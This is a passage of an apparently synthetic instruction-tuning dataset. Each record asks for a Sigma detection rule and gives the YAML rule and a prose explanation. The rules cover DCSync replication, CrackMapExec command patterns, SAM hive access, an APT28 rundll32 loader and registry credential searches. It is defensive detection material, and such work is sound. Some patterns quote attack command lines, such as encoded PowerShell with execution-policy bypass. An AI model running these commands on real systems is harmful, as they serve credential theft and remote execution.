    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4624\n        ComputerName: '%DomainControllersNamesList%'\n    selection2:\n        IpAddress: '%DomainControllersIpsList%'\n    selection3:\n        EventID: 4662\n        ComputerName: '%DomainControllersNamesList%'\n        SubjectLogonId: '%SuspiciousTargetLogonIdList%'\n        Properties|contains: \n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n    condition: write TargetLogonId from selection1 (if not selection2) to list %SuspiciousTargetLogonIdList%; then if selection3 -> alert\nfalsepositives:\n    - Legitimate administrator adding new domain controller to already existing domain\nlevel: medium\nstatus: unsupported\n",
      "question": "ntds.dit retrieving using synchronisation with legitimate domain controller using Directory Replication Service Remote Protocol",
      "answer": "In order to detect unauthorized attempts to retrieve the ntds.dit file through synchronization with a legitimate domain controller using the Directory Replication Service Remote Protocol, you should monitor specific indicators within Windows Security logs. Look for events that signify access requests to domain controllers, focusing on Windows Security Event IDs 4624 and 4662 in particular.\n\nEvent ID 4624 should be scrutinized for logons to your domain controllers, listed specifically by their names. This helps to identify any successful authentication attempts that could potentially be used for malicious purposes.\n\nAdditionally, monitor for any IP addresses that correspond to your domain controllers in the event of network-based interactions that could bypass typical authentication mechanisms, aiming to identify direct IP interactions that might signify suspicious activities.\n\nCrucially, focus on Event ID 4662, particularly looking for access requests to objects within the domain controllers specified by their names. This event should be cross-referenced with a list of suspicious target logon IDs, which are identified from previous monitoring (as specified in the initial logon monitoring step). The properties to watch for in these access requests include specific GUIDs ('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' and '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2') that are associated with actions on the domain controller that could indicate an attempt to replicate or retrieve sensitive directory data, such as the ntds.dit file.\n\nDetecting these activities involves a nuanced approach where a successful logon event (EventID 4624) to a domain controller that does not subsequently interact through a direct IP address (as checked against a predetermined list of domain controllers' IPs) flags the logon IDs associated with these events. These flagged IDs are then used to monitor for access (EventID 4662) involving the critical GUID properties. If these conditions are met, it indicates a potential unauthorized attempt to access or replicate directory services data, prompting an alert.\n\nBe aware that there are legitimate circumstances where these indicators may be triggered, such as when an administrator is adding a new domain controller to an existing domain. Therefore, it's crucial to analyze the context of alerts and investigate further to differentiate between legitimate administrative activities and malicious actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting doas tool execution in linux host platform. This utility tool allow standard users to perform tasks as root, the same way sudo does..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the doas tool execution in Linux host platform, which allows standard users to perform tasks as root in a similar manner to sudo, you should focus on monitoring process creation logs on Linux systems. Specifically, look for instances where the process image name ends with '/doas'. This action is a clear indication that the doas tool is being executed. Given the nature of doas, false positives are considered unlikely. However, the severity of this detection is considered low, suggesting that while it's important to track, it might not always indicate a malicious activity on its own.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/doas'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/doas'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: low\n",
      "question": "doas tool execution in linux host platform. This utility tool allow standard users to perform tasks as root, the same way sudo does.",
      "answer": "In order to detect the doas tool execution in Linux host platform, which allows standard users to perform tasks as root in a similar manner to sudo, you should focus on monitoring process creation logs on Linux systems. Specifically, look for instances where the process image name ends with '/doas'. This action is a clear indication that the doas tool is being executed. Given the nature of doas, false positives are considered unlikely. However, the severity of this detection is considered low, suggesting that while it's important to track, it might not always indicate a malicious activity on its own."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may attempt to find local system groups and permission settings.\nThe knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries attempting to find local system groups and permission settings to identify groups and users with elevated permissions, an analysis is conducted focused on PowerShell module activity within Windows systems. These activities often indicate an adversary's efforts to enumerate local system groups and their members, which can provide insights into users with elevated permissions, including those in the local administrators group. Detection of such activities involves monitoring for specific PowerShell commands.\n\nFirstly, PowerShell commands like 'get-localgroup' and 'Get-LocalGroupMember' are essential to watch for. These commands are indicative of attempts to list local groups and their members. Monitoring logs for the presence of these commands, either in the payload or context information of PowerShell module logs, holds importance.\n\nSecondly, the combination of 'Get-WMIObject' and 'Win32_Group' used together in PowerShell commands is another critical signal. This combination signifies efforts to query local group information via Windows Management Instrumentation (WMI), a more sophisticated method of accessing systems information which can include local group memberships and permissions.\n\nThese detection mechanisms are built on the premise that while legitimate administrative activities may employ these commands for routine system management and script execution, their use could also signify malicious intent. As a preventative measure, logs should be scrutinized for the execution of these specific PowerShell commands to guard against attempts to discover local system groups and elevate permissions through group membership awareness.\n\nGiven the nature of these detection strategies, occurrences might not always represent malicious actions. Sometimes, legitimate administrative tasks involve similar commands. Therefore, alerts generated at this level should be considered with a low severity rating until further analysis can verify the intent behind these commands. This consideration is crucial in distinguishing between normal administrative activities and potential security threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    test_3:\n        - Payload|contains:\n            - 'get-localgroup'\n            - 'Get-LocalGroupMember'\n        - ContextInfo|contains:\n            - 'get-localgroup'\n            - 'Get-LocalGroupMember'\n    test_6:\n        - Payload|contains|all:\n            - 'Get-WMIObject'\n            - 'Win32_Group'\n        - ContextInfo|contains|all:\n            - 'Get-WMIObject'\n            - 'Win32_Group'\n    condition: 1 of test_*\nfalsepositives:\n    - Administrator script\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    test_3:\n        - Payload|contains:\n            - 'get-localgroup'\n            - 'Get-LocalGroupMember'\n        - ContextInfo|contains:\n            - 'get-localgroup'\n            - 'Get-LocalGroupMember'\n    test_6:\n        - Payload|contains|all:\n            - 'Get-WMIObject'\n            - 'Win32_Group'\n        - ContextInfo|contains|all:\n            - 'Get-WMIObject'\n            - 'Win32_Group'\n    condition: 1 of test_*\nfalsepositives:\n    - Administrator script\nlevel: low\n",
      "question": "Adversaries may attempt to find local system groups and permission settings.\nThe knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n",
      "answer": "In order to detect adversaries attempting to find local system groups and permission settings to identify groups and users with elevated permissions, an analysis is conducted focused on PowerShell module activity within Windows systems. These activities often indicate an adversary's efforts to enumerate local system groups and their members, which can provide insights into users with elevated permissions, including those in the local administrators group. Detection of such activities involves monitoring for specific PowerShell commands.\n\nFirstly, PowerShell commands like 'get-localgroup' and 'Get-LocalGroupMember' are essential to watch for. These commands are indicative of attempts to list local groups and their members. Monitoring logs for the presence of these commands, either in the payload or context information of PowerShell module logs, holds importance.\n\nSecondly, the combination of 'Get-WMIObject' and 'Win32_Group' used together in PowerShell commands is another critical signal. This combination signifies efforts to query local group information via Windows Management Instrumentation (WMI), a more sophisticated method of accessing systems information which can include local group memberships and permissions.\n\nThese detection mechanisms are built on the premise that while legitimate administrative activities may employ these commands for routine system management and script execution, their use could also signify malicious intent. As a preventative measure, logs should be scrutinized for the execution of these specific PowerShell commands to guard against attempts to discover local system groups and elevate permissions through group membership awareness.\n\nGiven the nature of these detection strategies, occurrences might not always represent malicious actions. Sometimes, legitimate administrative tasks involve similar commands. Therefore, alerts generated at this level should be considered with a low severity rating until further analysis can verify the intent behind these commands. This consideration is crucial in distinguishing between normal administrative activities and potential security threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting defence evasion attempt via odbcconf.exe execution to load DLL.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect defense evasion attempts via odbcconf.exe execution to load DLL, you should: \n\nMonitor Windows process creation logs for occurrences where odbcconf.exe or rundll32.exe are executed, specifically looking towards certain conditions. For the first set of conditions involving odbcconf.exe, check if the executable image path ends with '\\odbcconf.exe' and the original file name matches 'odbcconf.exe'. Additionally, inspect the command line arguments for the presence of '-a', '-f', '/a', '/f', or 'regsvr', which are indicators of suspicious activities often used in command line parameters for automation and DLL registration activities. \n\nIn another scenario, also look out for instances where the parent image path ends with '\\odbcconf.exe' indicating it initiated another process, particularly targeted at instances where the child process image path ends with '\\rundll32.exe' and the original filename is 'RUNDLL32.EXE'. Rundll32.exe execution following odbcconf might indicate attempts to load or execute a DLL for evasion purposes.\n\nBe aware of possible legitimate uses of odbcconf.exe by authorized users that might generate false positives at a medium level of alert. This involves understanding regular usage patterns within your specific environment to effectively differentiate between benign and malicious activities. \n\nThis approach targets the identification of techniques involving Defence Evasion through the process of DLL loading using odbcconf.exe, which aligns with recognized tactics and techniques documented in the cybersecurity framework.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_1_cli:\n        CommandLine|contains:\n            - '-a'\n            - '-f'\n            - '/a'\n            - '/f'\n            - 'regsvr'\n    selection_2_parent:\n        ParentImage|endswith: '\\odbcconf.exe'\n    selection_2_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    condition: all of selection_1_* or all of selection_2_*\nfalsepositives:\n    - Legitimate use of odbcconf.exe by legitimate user\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1_img:\n        - Image|endswith: '\\odbcconf.exe'\n        - OriginalFileName: 'odbcconf.exe'\n    selection_1_cli:\n        CommandLine|contains:\n            - '-a'\n            - '-f'\n            - '/a'\n            - '/f'\n            - 'regsvr'\n    selection_2_parent:\n        ParentImage|endswith: '\\odbcconf.exe'\n    selection_2_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    condition: all of selection_1_* or all of selection_2_*\nfalsepositives:\n    - Legitimate use of odbcconf.exe by legitimate user\nlevel: medium\n",
      "question": "defence evasion attempt via odbcconf.exe execution to load DLL",
      "answer": "In order to detect defense evasion attempts via odbcconf.exe execution to load DLL, you should: \n\nMonitor Windows process creation logs for occurrences where odbcconf.exe or rundll32.exe are executed, specifically looking towards certain conditions. For the first set of conditions involving odbcconf.exe, check if the executable image path ends with '\\odbcconf.exe' and the original file name matches 'odbcconf.exe'. Additionally, inspect the command line arguments for the presence of '-a', '-f', '/a', '/f', or 'regsvr', which are indicators of suspicious activities often used in command line parameters for automation and DLL registration activities. \n\nIn another scenario, also look out for instances where the parent image path ends with '\\odbcconf.exe' indicating it initiated another process, particularly targeted at instances where the child process image path ends with '\\rundll32.exe' and the original filename is 'RUNDLL32.EXE'. Rundll32.exe execution following odbcconf might indicate attempts to load or execute a DLL for evasion purposes.\n\nBe aware of possible legitimate uses of odbcconf.exe by authorized users that might generate false positives at a medium level of alert. This involves understanding regular usage patterns within your specific environment to effectively differentiate between benign and malicious activities. \n\nThis approach targets the identification of techniques involving Defence Evasion through the process of DLL loading using odbcconf.exe, which aligns with recognized tactics and techniques documented in the cybersecurity framework."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution from an Alternate Data Stream (ADS). Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution from an Alternate Data Stream (ADS), where adversaries may use NTFS file attributes to hide their malicious data in order to evade detection, you should monitor process creation logs on Windows systems for specific command-line patterns. Look for instances where the command line contains 'txt:', which indicates potential access or interaction with an alternate data stream. Additionally, be alert for command lines that combine certain tools and parameters, such as:\n\n- Use of 'type ' along with redirection '> ', which may suggest an attempt to display or redirect the contents of a file, possibly involving an ADS.\n- Execution involving 'makecab ' followed by '.cab', which could indicate compression of files into a Cabinet file, potentially to disguise malicious activity.\n- Commands starting with 'reg ' followed by ' export ', suggesting attempts to export registry keys, possibly for analysis or manipulation outside of standard registry tools.\n- Utilization of 'regedit ' with ' /E ', indicating export operations via Registry Editor, again potentially for malicious manipulation.\n- Execution of 'esentutl ' accompanied by '/y', '/d', and '/o' flags, which points to attempts to copy, defragment, or repair Extensible Storage Engine databases, potentially indicating more sophisticated adversary behavior involving data manipulation or extraction.\n\nIn essence, by monitoring for these specific command-line activities within process creation events, one can uncover potential misuse of alternate data streams by adversaries aiming to execute or hide malicious data, supporting efforts to evade detection. This monitoring approach crucially targets a range of tools and operations that could be exploited for such purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_stream:\n        CommandLine|contains: 'txt:'\n    selection_tools_type:\n        CommandLine|contains|all:\n            - 'type '\n            - ' > '\n    selection_tools_makecab:\n        CommandLine|contains|all:\n            - 'makecab '\n            - '.cab'\n    selection_tools_reg:\n        CommandLine|contains|all:\n            - 'reg '\n            - ' export '\n    selection_tools_regedit:\n        CommandLine|contains|all:\n            - 'regedit '\n            - ' /E '\n    selection_tools_esentutl:\n        CommandLine|contains|all:\n            - 'esentutl '\n            - ' /y '\n            - ' /d '\n            - ' /o '\n    condition: selection_stream and (1 of selection_tools_*)\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_stream:\n        CommandLine|contains: 'txt:'\n    selection_tools_type:\n        CommandLine|contains|all:\n            - 'type '\n            - ' > '\n    selection_tools_makecab:\n        CommandLine|contains|all:\n            - 'makecab '\n            - '.cab'\n    selection_tools_reg:\n        CommandLine|contains|all:\n            - 'reg '\n            - ' export '\n    selection_tools_regedit:\n        CommandLine|contains|all:\n            - 'regedit '\n            - ' /E '\n    selection_tools_esentutl:\n        CommandLine|contains|all:\n            - 'esentutl '\n            - ' /y '\n            - ' /d '\n            - ' /o '\n    condition: selection_stream and (1 of selection_tools_*)\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution from an Alternate Data Stream (ADS). Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection",
      "answer": "In order to detect execution from an Alternate Data Stream (ADS), where adversaries may use NTFS file attributes to hide their malicious data in order to evade detection, you should monitor process creation logs on Windows systems for specific command-line patterns. Look for instances where the command line contains 'txt:', which indicates potential access or interaction with an alternate data stream. Additionally, be alert for command lines that combine certain tools and parameters, such as:\n\n- Use of 'type ' along with redirection '> ', which may suggest an attempt to display or redirect the contents of a file, possibly involving an ADS.\n- Execution involving 'makecab ' followed by '.cab', which could indicate compression of files into a Cabinet file, potentially to disguise malicious activity.\n- Commands starting with 'reg ' followed by ' export ', suggesting attempts to export registry keys, possibly for analysis or manipulation outside of standard registry tools.\n- Utilization of 'regedit ' with ' /E ', indicating export operations via Registry Editor, again potentially for malicious manipulation.\n- Execution of 'esentutl ' accompanied by '/y', '/d', and '/o' flags, which points to attempts to copy, defragment, or repair Extensible Storage Engine databases, potentially indicating more sophisticated adversary behavior involving data manipulation or extraction.\n\nIn essence, by monitoring for these specific command-line activities within process creation events, one can uncover potential misuse of alternate data streams by adversaries aiming to execute or hide malicious data, supporting efforts to evade detection. This monitoring approach crucially targets a range of tools and operations that could be exploited for such purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting various execution patterns of the CrackMapExec pentesting framework.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect various execution patterns of the CrackMapExec pentesting framework, you should: Monitor process creation logs on Windows systems for specific command line patterns indicating potential use of the framework. These patterns include command line instructions ending with redirections such as 'cmd.exe /Q /c' followed by an attempt to redirect output to a remote shared folder, which could be an indication of executing remote commands or running fileless scripts via SMB/WMI. Additionally, attention should be paid to command lines that contain powershell.exe executions, especially with flags implying obfuscation or encoding, which suggests an attempt to bypass PowerShell execution policies. These activities are associated with tactics and techniques like Execution, PowerShell, and Command and Scripting Interpreter. You should specifically look out for command lines that attempt to execute PowerShell in a way that bypasses the default security features, or that directs output to remote locations or temporary files, indicative of stealthy or fileless operations. Conclusively, any match against these patterns should be scrutinized, although bearing in mind that there could be unknown false positives. Fields of interest in this scenario include ComputerName, User, and CommandLine.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith:\n            # cme/protocols/smb/wmiexec.py (generalized execute_remote and execute_fileless)\n            - 'cmd.exe /Q /c * 1> \\\\\\\\*\\\\*\\\\* 2>&1'\n            # cme/protocols/smb/atexec.py:109 (fileless output via share)\n            - 'cmd.exe /C * > \\\\\\\\*\\\\*\\\\* 2>&1'\n            # cme/protocols/smb/atexec.py:111 (fileless output via share)\n            - 'cmd.exe /C * > *\\\\Temp\\\\* 2>&1'\n        CommandLine|contains:\n            # cme/helpers/powershell.py:139 (PowerShell execution with obfuscation)\n            - 'powershell.exe -exec bypass -noni -nop -w 1 -C \"'\n            # cme/helpers/powershell.py:149 (PowerShell execution without obfuscation)\n            - 'powershell.exe -noni -nop -w 1 -enc '\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|endswith:\n            # cme/protocols/smb/wmiexec.py (generalized execute_remote and execute_fileless)\n            - 'cmd.exe /Q /c * 1> \\\\\\\\*\\\\*\\\\* 2>&1'\n            # cme/protocols/smb/atexec.py:109 (fileless output via share)\n            - 'cmd.exe /C * > \\\\\\\\*\\\\*\\\\* 2>&1'\n            # cme/protocols/smb/atexec.py:111 (fileless output via share)\n            - 'cmd.exe /C * > *\\\\Temp\\\\* 2>&1'\n        CommandLine|contains:\n            # cme/helpers/powershell.py:139 (PowerShell execution with obfuscation)\n            - 'powershell.exe -exec bypass -noni -nop -w 1 -C \"'\n            # cme/helpers/powershell.py:149 (PowerShell execution without obfuscation)\n            - 'powershell.exe -noni -nop -w 1 -enc '\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "various execution patterns of the CrackMapExec pentesting framework",
      "answer": "In order to detect various execution patterns of the CrackMapExec pentesting framework, you should: Monitor process creation logs on Windows systems for specific command line patterns indicating potential use of the framework. These patterns include command line instructions ending with redirections such as 'cmd.exe /Q /c' followed by an attempt to redirect output to a remote shared folder, which could be an indication of executing remote commands or running fileless scripts via SMB/WMI. Additionally, attention should be paid to command lines that contain powershell.exe executions, especially with flags implying obfuscation or encoding, which suggests an attempt to bypass PowerShell execution policies. These activities are associated with tactics and techniques like Execution, PowerShell, and Command and Scripting Interpreter. You should specifically look out for command lines that attempt to execute PowerShell in a way that bypasses the default security features, or that directs output to remote locations or temporary files, indicative of stealthy or fileless operations. Conclusively, any match against these patterns should be scrutinized, although bearing in mind that there could be unknown false positives. Fields of interest in this scenario include ComputerName, User, and CommandLine."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting AWS Config Service disabling.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect AWS Config Service disabling, you should monitor CloudTrail logs for specific activities that indicate a potential disruption of the AWS Config service. Specifically, look out for logs where the event source is `config.amazonaws.com` and the event name is either `DeleteDeliveryChannel` or `StopConfigurationRecorder`. These events suggest that someone might be trying to delete the delivery channel or stop the configuration recorder within AWS Config, which are critical components for the monitoring and governance of AWS resources. The configurations being changed or stopped could signify a deliberate attempt to evade detection or weaken security policies. It is essential to treat these actions with a high level of suspicion, although it's also important to recognize that there may be legitimate reasons for such changes, such as a valid modification in the AWS Config service setup by the administrators. As such, while this activity is being flagged as of 'high' level concern due to its potential implications on security posture, it is also recommended to verify the context of these actions to discern between malicious activity and legitimate administrative tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: config.amazonaws.com\n        eventName:\n            - DeleteDeliveryChannel\n            - StopConfigurationRecorder\n    condition: selection_source\nfalsepositives:\n    - Valid change in AWS Config Service\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: config.amazonaws.com\n        eventName:\n            - DeleteDeliveryChannel\n            - StopConfigurationRecorder\n    condition: selection_source\nfalsepositives:\n    - Valid change in AWS Config Service\nlevel: high\n",
      "question": "AWS Config Service disabling",
      "answer": "In order to detect AWS Config Service disabling, you should monitor CloudTrail logs for specific activities that indicate a potential disruption of the AWS Config service. Specifically, look out for logs where the event source is `config.amazonaws.com` and the event name is either `DeleteDeliveryChannel` or `StopConfigurationRecorder`. These events suggest that someone might be trying to delete the delivery channel or stop the configuration recorder within AWS Config, which are critical components for the monitoring and governance of AWS resources. The configurations being changed or stopped could signify a deliberate attempt to evade detection or weaken security policies. It is essential to treat these actions with a high level of suspicion, although it's also important to recognize that there may be legitimate reasons for such changes, such as a valid modification in the AWS Config service setup by the administrators. As such, while this activity is being flagged as of 'high' level concern due to its potential implications on security posture, it is also recommended to verify the context of these actions to discern between malicious activity and legitimate administrative tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting handles requested to SAM registry hive.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect handles requested to SAM registry hive, you should monitor security logs from Windows systems. Look specifically for event ID 4656, which indicates an attempt to request a handle. Focus on instances where the object type is 'Key' and the name of the object ends with '\\SAM', as this suggests the Security Accounts Manager (SAM) registry hive is being targeted. Capture details such as the computer name, the domain name of the subject, the username of the subject, the process name, and the exact name of the object involved in the event. Be aware that while this detection is crucial for identifying potential security breaches, there may be cases where legitimate processes trigger these alerts, although such instances are not well-documented and thus labeled as unknown false positives. The severity level for these detections is considered high due to the sensitivity of the SAM registry hive, which stores critical system and user account information.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4656\n        ObjectType: 'Key'\n        ObjectName|endswith: '\\SAM'\n    condition: selection\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\n    - ProcessName\n    - ObjectName\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4656\n        ObjectType: 'Key'\n        ObjectName|endswith: '\\SAM'\n    condition: selection\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\n    - ProcessName\n    - ObjectName\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "handles requested to SAM registry hive",
      "answer": "In order to detect handles requested to SAM registry hive, you should monitor security logs from Windows systems. Look specifically for event ID 4656, which indicates an attempt to request a handle. Focus on instances where the object type is 'Key' and the name of the object ends with '\\SAM', as this suggests the Security Accounts Manager (SAM) registry hive is being targeted. Capture details such as the computer name, the domain name of the subject, the username of the subject, the process name, and the exact name of the object involved in the event. Be aware that while this detection is crucial for identifying potential security breaches, there may be cases where legitimate processes trigger these alerts, although such instances are not well-documented and thus labeled as unknown false positives. The severity level for these detections is considered high due to the sensitivity of the SAM registry hive, which stores critical system and user account information."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Trojan loader activity as used by APT28.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Trojan loader activity as used by APT28, you should: Focus on monitoring the creation of processes in Windows environments. Specifically, watch for instances where 'rundll32.exe' is executed, which is a common method used by attackers to load malicious DLLs. Pay special attention to command lines that include references to the '%LOCALAPPDATA%' or the '\\AppData\\Local\\' path, as these directories are often used to store and execute malicious payloads. Additionally, be on alert for command lines that contain '.dat\",' or end with '.dll #1', '.dll\" #1', or '.dll\",#1', which are indications that a DLL is being specifically targeted for loading by the malware. Exclude any command line activity that involves '\\AppData\\Local\\Temp\\', as this might lead to false positives. By following these guidelines, threats leveraging similar tactics and techniques associated with Advanced Persistent Threats (APT) like APT28 can be effectively identified.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_path:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            - '%LOCALAPPDATA%'\n            - '\\AppData\\Local\\'\n    selection_extensions:\n        - CommandLine|contains: '.dat\",'\n        - CommandLine|endswith:\n            - '.dll #1'\n            - '.dll\" #1'\n            - '.dll\",#1'\n    filter_main_exclude_temp:\n        CommandLine|contains: '\\AppData\\Local\\Temp\\'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_path:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            - '%LOCALAPPDATA%'\n            - '\\AppData\\Local\\'\n    selection_extensions:\n        - CommandLine|contains: '.dat\",'\n        - CommandLine|endswith:\n            - '.dll #1'\n            - '.dll\" #1'\n            - '.dll\",#1'\n    filter_main_exclude_temp:\n        CommandLine|contains: '\\AppData\\Local\\Temp\\'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Trojan loader activity as used by APT28",
      "answer": "In order to detect Trojan loader activity as used by APT28, you should: Focus on monitoring the creation of processes in Windows environments. Specifically, watch for instances where 'rundll32.exe' is executed, which is a common method used by attackers to load malicious DLLs. Pay special attention to command lines that include references to the '%LOCALAPPDATA%' or the '\\AppData\\Local\\' path, as these directories are often used to store and execute malicious payloads. Additionally, be on alert for command lines that contain '.dat\",' or end with '.dll #1', '.dll\" #1', or '.dll\",#1', which are indications that a DLL is being specifically targeted for loading by the malware. Exclude any command line activity that involves '\\AppData\\Local\\Temp\\', as this might lead to false positives. By following these guidelines, threats leveraging similar tactics and techniques associated with Advanced Persistent Threats (APT) like APT28 can be effectively identified."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may search the Registry on compromised systems for insecurely stored credentials.\nThe Windows Registry stores configuration information that can be used by the system or other programs.\nAdversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries searching the Registry on compromised systems for insecurely stored credentials, you should monitor for signs of registry querying activities that focus on extracting sensitive information. Specifically, look for the creation of processes associated with the Windows Registry Editor tool, reg.exe. The detection mechanism should trigger alerts when reg.exe processes are observed executing commands that involve querying ('query') the registry with specific parameters targeting string values ('REG_SZ'), conducted in a recursive manner ('/s'), and filtering for types ('/t'). Additionally, detection should be honed in on commands that attempt to search ('/f') within critical registry hives such as HKLM (HKEY_LOCAL_MACHINE) and HKCU (HKEY_CURRENT_USER), including specific paths known to store configurations related to software like PuTTY under HKCU\\Software\\SimonTatham\\PuTTY\\Sessions. Such activities are indicative of attempts by adversaries to retrieve insecurely stored credentials from the registry, which could be used to facilitate further attacks or gains. The level of alert for this detection is considered medium, indicating a noteworthy severity that should prompt investigation, despite the potential for unknown false positives. This approach aligns with the methodology to secure systems against attackers leveraging registry information, particularly focusing on the credential access technique through registry data mining.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    reg:\n        Image|endswith: '\\reg.exe'\n        CommandLine|contains|all:\n            - ' query '\n            - '/t '\n            - 'REG_SZ'\n            - '/s'\n    hive:\n        - CommandLine|contains|all:\n            - '/f '\n            - 'HKLM'\n        - CommandLine|contains|all:\n            - '/f '\n            - 'HKCU'\n        - CommandLine|contains: 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions'\n    condition: reg and hive\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    reg:\n        Image|endswith: '\\reg.exe'\n        CommandLine|contains|all:\n            - ' query '\n            - '/t '\n            - 'REG_SZ'\n            - '/s'\n    hive:\n        - CommandLine|contains|all:\n            - '/f '\n            - 'HKLM'\n        - CommandLine|contains|all:\n            - '/f '\n            - 'HKCU'\n        - CommandLine|contains: 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions'\n    condition: reg and hive\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Adversaries may search the Registry on compromised systems for insecurely stored credentials.\nThe Windows Registry stores configuration information that can be used by the system or other programs.\nAdversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services\n",
